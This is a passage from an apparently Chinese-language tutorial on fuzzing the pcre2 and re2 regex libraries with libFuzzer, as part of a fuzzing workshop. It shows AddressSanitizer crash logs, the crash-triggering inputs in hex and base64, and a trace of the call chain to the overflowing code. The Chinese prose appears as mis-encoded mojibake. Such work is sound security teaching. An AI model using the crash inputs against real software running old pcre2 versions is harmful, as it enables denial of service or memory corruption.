class="line">\\C+\\S+\xde\xac\xd4\xa3S+!!h</span><br><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-5ae911f7e958e646e05ebe28421183f6efc0bc88</span><br><span class="line">Base64: XEMrXFMr3qzUo1MrISFo</span><br></pre></td></tr></table></figure><p><code>SUMMARY: AddressSanitizer: stack-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:5968:11 in match</code>æŒ‡å‡ºåœ¨pcre2_match.cé‡Œå­˜åœ¨stackoverflowã€‚å¯¹æ¼æ´è¿›è¡Œå®šä½ï¼š<br>åœ¨pcre2posix.cä¸­è°ƒç”¨äº†pcre2_match</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#in pcre2posix.c</span></span><br><span class="line">rc = pcre2_match((<span class="type">const</span> pcre2_code *)preg-&gt;re_pcre2_code,(PCRE2_SPTR)<span class="built_in">string</span> + so, (eo - so), <span class="number">0</span>, options, md, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>pcre2_matchå®šä¹‰åœ¨pcre2_match.cä¸­ï¼Œåœ¨pcre2_matchä¸­è°ƒç”¨äº†matchå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#in pcre2_match.c</span></span><br><span class="line">rc = match(start_match, mb-&gt;start_code, start_match, <span class="number">2</span>, mb, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œmatchçš„è¿‡ç¨‹ä¸­å‡ºç°æ ˆæº¢å‡ºçš„ä½ç½®åœ¨äºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)</span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">if</span> (eptr == pp) <span class="keyword">goto</span> TAIL_RECURSE;</span><br><span class="line">   RMATCH(eptr, ecode, offset_top, mb, eptrb, RM46);</span><br><span class="line">   <span class="keyword">if</span> (rrc != MATCH_NOMATCH) RRETURN(rrc);</span><br><span class="line">   eptr--;</span><br><span class="line">   BACKCHAR(eptr);   <span class="comment">//overflowå¤„</span></span><br><span class="line">   <span class="keyword">if</span> (ctype == OP_ANYNL &amp;&amp; eptr &gt; pp  &amp;&amp; UCHAR21(eptr) == CHAR_NL &amp;&amp;</span><br><span class="line">       UCHAR21(eptr - <span class="number">1</span>) == CHAR_CR) eptr--;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¥ä¸ºfuzzçš„å·¥ä½œå·²ç»å®Œæˆçš„æ—¶å€™ï¼Œåªæ˜¯å°è¯•ç€ä¿®æ”¹äº†ä¸€ä¸‹ç¼–è¯‘é“¾æ¥harnessæ—¶çš„é™æ€åº“ä¸ºå…¨éƒ¨åº“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope pcre2_fuzzer.cc -I pcre2-10.00/src -Wl,--whole-archive pcre2-10.00/.libs/*.a -Wl,-no-whole-archive -fsanitize=fuzzer -o pcre2-10.00-fsanitize_fuzzer</span><br></pre></td></tr></table></figure><p>å†æ¬¡fuzzçš„ç»“æœä»¤æˆ‘æƒŠè®¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#605510REDUCE cov: 3273 ft: 15706 corp: 6963/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 18/86 MS: 1 EraseBytes-</span><br><span class="line">#605733NEW    cov: 3273 ft: 15707 corp: 6964/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 29/86 MS: 3 ShuffleBytes-CopyPart-CMP- DE: &quot;+n&quot;-</span><br><span class="line">#605994REDUCE cov: 3273 ft: 15707 corp: 6964/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 36/86 MS: 1 EraseBytes-</span><br><span class="line">#606040REDUCE cov: 3273 ft: 15707 corp: 6964/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 19/86 MS: 1 EraseBytes-</span><br><span class="line">#606121NEW    cov: 3273 ft: 15708 corp: 6965/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 27/86 MS: 1 CopyPart-</span><br><span class="line">#606196NEW    cov: 3273 ft: 15709 corp: 6966/139Kb lim: 86 exec/s: 255 rss: 597Mb L: 86/86 MS: 5 ChangeASCIIInt-ChangeBit-ChangeBit-ChangeASCIIInt-CrossOver-</span><br><span class="line">=================================================================</span><br><span class="line">==10857==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6110001625ea at pc 0x00000055d548 bp 0x7ffccf4098f0 sp 0x7ffccf4098e8</span><br><span class="line">WRITE of size 1 at 0x6110001625ea thread T0</span><br><span class="line">    #0 0x55d547 in _pcre2_ord2utf_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_ord2utf.c:92:12</span><br><span class="line">    #1 0x4f60f4 in add_to_class /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:2870:20</span><br><span class="line">    #2 0x4f5dd0 in add_to_class /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:2820:18</span><br><span class="line">    #3 0x4e03e0 in compile_branch /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:3923:11</span><br><span class="line">    #4 0x4d3f2f in compile_regex /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:6723:8</span><br><span class="line">    #5 0x4d136c in pcre2_compile_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:7734:7</span><br><span class="line">    #6 0x56c3b3 in regcomp /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2posix.c:219:23</span><br><span class="line">    #7 0x4c83c9 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:19:12</span><br><span class="line">    #8 0x585632 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:556:15</span><br><span class="line">    #9 0x584cd5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:470:3</span><br><span class="line">    #10 0x58606c in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:698:19</span><br><span class="line">    #11 0x586c75 in fuzzer::Fuzzer::Loop(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:830:5</span><br><span class="line">    #12 0x572b8b in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerDriver.cpp:824:6</span><br><span class="line">    #13 0x56cc20 in main /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerMain.cpp:19:10</span><br><span class="line">    #14 0x7f16a7ecbbf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)</span><br><span class="line">    #15 0x41deb9 in _start (/home/admin/libfuzzer-workshop/lessons/11/pcre2_10.00_fuzzer+0x41deb9)</span><br><span class="line"></span><br><span class="line">0x6110001625ea is located 0 bytes to the right of 234-byte region [0x611000162500,0x6110001625ea)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #0 0x495dbd in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3</span><br><span class="line">    #1 0x4d0953 in pcre2_compile_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_compile.c:7656:3</span><br><span class="line">    #2 0x56c3b3 in regcomp /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2posix.c:219:23</span><br><span class="line">    #3 0x4c83c9 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:19:12</span><br><span class="line">    #4 0x585632 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:556:15</span><br><span class="line">    #5 0x584cd5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:470:3</span><br><span class="line">    #6 0x58606c in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:698:19</span><br><span class="line">    #7 0x586c75 in fuzzer::Fuzzer::Loop(std::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerLoop.cpp:830:5</span><br><span class="line">    #8 0x572b8b in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerDriver.cpp:824:6</span><br><span class="line">    #9 0x56cc20 in main /home/admin/libfuzzer-workshop/libFuzzer/Fuzzer/./FuzzerMain.cpp:19:10</span><br><span class="line">    #10 0x7f16a7ecbbf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_ord2utf.c:92:12 in _pcre2_ord2utf_8</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x0c2280024460: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa</span><br><span class="line">  0x0c2280024470: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd</span><br><span class="line">  0x0c2280024480: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd</span><br><span class="line">  0x0c2280024490: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c22800244a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">=&gt;0x0c22800244b0: 00 00 00 00 00 00 00 00 00 00 00 00 00[02]fa fa</span><br><span class="line">  0x0c22800244c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c22800244d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c22800244e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c22800244f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c2280024500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==10857==ABORTING</span><br><span class="line">MS: 5 InsertRepeatedBytes-CMP-CrossOver-ChangeBit-CrossOver- DE: &quot;+\xc6&quot;-; base unit: ce48e02587af5cb5d3e84053d6d5b4545bbb6e32</span><br><span class="line">0x5b,0x2a,0x5d,0x3f,0x5b,0x3f,0x3f,0x5c,0x53,0x3f,0x5b,0x2a,0x5d,0x3f,0x5b,0x3f,0x3f,0x5c,0x53,0x2a,0x63,0x20,0x20,0x20,0x25,0xc6,0xa4,0x1a,0x2d,0x5b,0x43,0x1a,0x2d,0xc6,0xa4,0x5d,0x50,0x2a,0x5d,0x50,0x2a,0x5e,0x58,0x42,0x5c,0x5c,0x3f,0x77,0xc,0x5c,0x77,0x0,0x36,0x5c,0x20,0xa0,0xc0,0xec,0x2d,0x3f,0x5c,0x77,0x3f,0x5c,0x2d,0xac,0x3f,0x5c,</span><br><span class="line">[*]?[??\\S?[*]?[??\\S*c   %\xc6\xa4\x1a-[C\x1a-\xc6\xa4]P*]P*^XB\\\\?w\x0c\\w\x006\\ \xa0\xc0\xec-?\\w?\\-\xac?\\</span><br><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-849705875bb2098817f3299ee582e2207a568e63</span><br><span class="line">Base64: WypdP1s/P1xTP1sqXT9bPz9cUypjICAgJcakGi1bQxotxqRdUCpdUCpeWEJcXD93DFx3ADZcIKDA7C0/XHc/XC2sP1w=</span><br><span class="line">stat::number_of_executed_units: 606206</span><br><span class="line">stat::average_exec_per_sec:     255</span><br><span class="line">stat::new_units_added:          8960</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              598</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†ä¸€ä¸ªä¸ä¸€æ ·çš„crashã€‚ä½†è¿™ä¹Ÿåœ¨æƒ…ç†ä¹‹ä¸­ï¼Œé€šè¿‡é“¾æ¥ä¸åŒæˆ–æ›´å¤šçš„é™æ€åº“ã€‚åªè¦harnessç¨‹åºé€»è¾‘æ‰€èƒ½æ¶‰åŠåˆ°ï¼Œå°±æœ‰æœºä¼šå¾—åˆ°ä¸åŒé™æ€åº“é‡Œçš„crashã€‚<br>é€šè¿‡<code>SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_ord2utf.c:92:12 in _pcre2_ord2utf_8</code>æˆ‘ä»¬äº†è§£åˆ°åœ¨pcre2_ord2utf.cä¸­å­˜åœ¨heapoverflowçš„æ¼æ´ã€‚åŒæ ·å¯¹æ¼æ´è¿›è¡Œå®šä½ï¼š<br>è¿™æ¬¡çš„å‡½æ•°è°ƒç”¨æœ‰ç‚¹å¤šï¼Œä¸€å±‚ä¸€å±‚çš„æ‰¾ï¼š<br>é¦–å…ˆåœ¨<code>pcre2posix.c</code>ä¸­è°ƒç”¨<code>pcre2_compile</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg-&gt;re_pcre2_code = pcre2_compile((PCRE2_SPTR)pattern, <span class="number">-1</span>, options,</span><br><span class="line">  &amp;errorcode, &amp;erroffset, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°å®šä¹‰åœ¨<code>pcre2_compile.c</code>ä¸­ï¼Œç„¶ååˆè°ƒç”¨äº†<code>compile_regex</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="type">void</span>)compile_regex(re-&gt;overall_options, &amp;code, &amp;ptr, &amp;errorcode, FALSE, FALSE,</span><br><span class="line">   <span class="number">0</span>, <span class="number">0</span>, &amp;firstcu, &amp;firstcuflags, &amp;reqcu, &amp;reqcuflags, <span class="literal">NULL</span>, &amp;cb, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>ä¹‹ååœ¨å‡½æ•°<code>compile_regex</code>ä¸­åˆè°ƒç”¨äº†<code>compile_branch</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!compile_branch(&amp;options, &amp;code, &amp;ptr, errorcodeptr, &amp;branchfirstcu,</span><br><span class="line">       &amp;branchfirstcuflags, &amp;branchreqcu, &amp;branchreqcuflags, &amp;bc,</span><br><span class="line">       cond_depth, cb, (lengthptr == <span class="literal">NULL</span>)? <span class="literal">NULL</span> : &amp;length))</span><br><span class="line">   &#123;</span><br><span class="line">   *ptrptr = ptr;</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>compile_branch</code>ä¸­åˆè°ƒç”¨äº†<code>add_to_class</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class_has_8bitchar +=</span><br><span class="line">          add_to_class(classbits, &amp;class_uchardata, options, cb, c, d);</span><br></pre></td></tr></table></figure><p>æ¥ç€<code>add_to_class</code>è°ƒç”¨<code>PRIV</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (start == end)</span><br><span class="line">      &#123;</span><br><span class="line">      *uchardata++ = XCL_SINGLE;</span><br><span class="line">      uchardata += PRIV(ord2utf)(start, uchardata);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>PRIV</code>å®šä¹‰åœ¨<code>pcre2_ord2utf.c</code>ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">PRIV</span><span class="params">(ord2utf)</span><span class="params">(<span class="type">uint32_t</span> cvalue, PCRE2_UCHAR *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Convert to UTF-8 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PCRE2_CODE_UNIT_WIDTH == 8</span></span><br><span class="line"><span class="keyword">register</span> <span class="type">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; PRIV(utf8_table1_size); i++)</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">int</span>)cvalue &lt;= PRIV(utf8_table1)[i]) <span class="keyword">break</span>;</span><br><span class="line">buffer += i;</span><br><span class="line"><span class="keyword">for</span> (j = i; j &gt; <span class="number">0</span>; j--)</span><br><span class="line"> &#123;</span><br><span class="line"> *buffer-- = <span class="number">0x80</span> | (cvalue &amp; <span class="number">0x3f</span>);  <span class="comment">//æ­¤å¤„å¯¹äºå†…å­˜æŒ‡é’ˆå¾ªç¯æ“ä½œç”±äºé™åˆ¶æ¡ä»¶ä¸å½“å¯¼è‡´å‡ºç°äº†heap_overflow</span></span><br><span class="line"> cvalue &gt;&gt;= <span class="number">6</span>;</span><br><span class="line"> &#125;</span><br><span class="line">*buffer = PRIV(utf8_table2)[i] | cvalue;</span><br><span class="line"><span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Convert to UTF-16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> PCRE2_CODE_UNIT_WIDTH == 16</span></span><br><span class="line"><span class="keyword">if</span> (cvalue &lt;= <span class="number">0xffff</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  *buffer = (PCRE2_UCHAR)cvalue;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">cvalue -= <span class="number">0x10000</span>;</span><br><span class="line">*buffer++ = <span class="number">0xd800</span> | (cvalue &gt;&gt; <span class="number">10</span>);</span><br><span class="line">*buffer = <span class="number">0xdc00</span> | (cvalue &amp; <span class="number">0x3ff</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Convert to UTF-32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">*buffer = (PCRE2_UCHAR)cvalue;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸‹è¿™ä¸¤ä¸ªcrashï¼š<br>ç¬¬ä¸€ä¸ªcrashç”±harnessä¸­çš„<code>regexech</code>å‡½æ•°çš„åŒ¹é…é€»è¾‘è§¦å‘<code>stack_overflow</code>ï¼Œä½äº<code>pcre2_match.c:5968:11</code>ï¼›ç¬¬äºŒä¸ªcrashç”±<code>regcomp</code>å‡½æ•°çš„ç¼–è¯‘é€»è¾‘è§¦å‘<code>heap_overflow</code>ï¼Œä½äº<code>pcre2_ord2utf.c:92:12</code>ã€‚<br>ä¸€å±‚å±‚çš„å‡½æ•°è°ƒç”¨å…³ç³»åˆ†æå¾—è®©äººå¤´å¤§ï¼Œä½†è¿™ä¹Ÿæ­£ä½“ç°äº†æ¼æ´æŒ–æ˜ä¸­çš„â€œæŒ–æ˜â€äºŒå­—çš„å«ä¹‰ã€‚</p><h4 id="fuzzing-re2"><a href="#fuzzing-re2" class="headerlink" title="fuzzing re2"></a>fuzzing re2</h4><p>è¿™ä¸€ä¸ªä¾‹å­å°†è®©æˆ‘ä»¬æ„è¯†åˆ°<code>max_len</code>çš„é€‰æ‹©å¯¹äºfuzzæ•ˆç‡çš„å½±å“ã€‚<br>re2æ˜¯ä¸€ä¸ªé«˜æ•ˆçš„ã€åŸåˆ™æ€§çš„æ­£åˆ™è¡¨è¾¾å¼åº“ã€‚æ˜¯ç”±ä¸¤ä½æ¥åœ¨Googleçš„å¤§ç¥ç”¨C++å®ç°çš„ã€‚Goä¸­çš„regexpæ­£åˆ™è¡¨è¾¾å¼åŒ…ä¹Ÿæ˜¯ç”±re2å®ç°çš„ã€‚workshopæä¾›çš„æ˜¯re2-2014-12-09çš„ç‰ˆæœ¬ã€‚<br>å…ˆæºç ç¼–è¯‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar xzf re2.tgz</span><br><span class="line">cd re2</span><br><span class="line">export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope&quot;</span><br><span class="line">make clean</span><br><span class="line">CXX=clang++ CXXFLAGS=&quot;$FUZZ_CXXFLAGS&quot;  make -j</span><br></pre></td></tr></table></figure><p>æ¥ç€ç ”ç©¶harnessï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright (c) 2016 The Chromium Authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;re2/re2.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;util/logging.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">using <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span>&amp; buffer, <span class="type">const</span> <span class="built_in">string</span>&amp; pattern,</span></span><br><span 